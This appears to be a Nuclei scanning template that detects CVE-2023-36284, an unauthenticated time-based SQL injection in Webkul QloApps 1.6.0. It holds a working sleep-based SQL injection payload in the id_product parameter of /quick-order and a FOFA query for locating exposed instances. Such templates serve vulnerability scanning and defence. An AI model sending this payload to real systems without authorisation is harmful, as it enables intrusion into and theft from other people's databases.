flow: http(1) && http(2)
http:
- matchers:
  - case-insensitive: true
    internal: true
    part: body
    type: word
    words:
    - QloApps
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - duration>=5
    - contains(body, "<span>Guest Information")
    type: dsl
  raw:
  - '@timeout: 20s

    GET /quick-order?date_from=2023-06-12%2000:00:00&date_to=2023-06-13%2000:00:00&deleteFromOrderLine=1&id_product=(select(0)from(select(sleep(5)))v)
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-36284
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:webkul:qloapps:1.6.0:*:*:*:*:*:*:*
    cve-id: CVE-2023-36284
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-89
    epss-percentile: 0.95894
    epss-score: 0.24278
  description: 'An unauthenticated Time-Based SQL injection found in Webkul QloApps
    1.6.0 via GET parameters date_from, date_to, and id_product allows a remote attacker
    to retrieve the contents of an entire database.

    '
  impact: 'Successful exploitation could lead to unauthorized access to sensitive
    data.

    '
  metadata:
    fofa-query:
    - title="QloApps"
    - title="qloapps"
    max-request: 2
    product: qloapps
    vendor: webkul
    verified: true
  name: QloApps 1.6.0 - SQL Injection
  reference:
  - https://flashy-lemonade-192.notion.site/Time-Based-SQL-injection-in-QloApps-1-6-0-be3ed1bdaf784a77b45dc6898a2de17e
  - https://nvd.nist.gov/vuln/detail/CVE-2023-36284
  remediation: 'Apply the vendor-supplied patch or upgrade to a non-vulnerable version.

    '
  severity: high
  tags: time-based-sqli,cve,cve2023,qloapps,sqli,webkul,vuln
